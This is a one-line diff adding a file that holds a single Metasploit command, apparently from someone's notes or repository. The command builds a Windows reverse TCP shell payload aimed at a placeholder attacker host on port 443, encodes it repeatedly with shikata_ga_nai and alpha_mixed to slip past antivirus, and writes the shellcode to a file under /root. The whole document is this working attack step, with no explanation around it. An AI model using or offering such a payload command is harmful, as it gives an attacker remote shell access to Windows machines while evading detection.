@@ -1,0 +1,1 @@
+msfvenom -p windows/shell/reverse_tcp LHOST=[yo jank] -e x86/shikata_ga_nai -f raw -i 25 EXITFUNC=thread LPORT=443 | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX > /root/datshellcode.txt
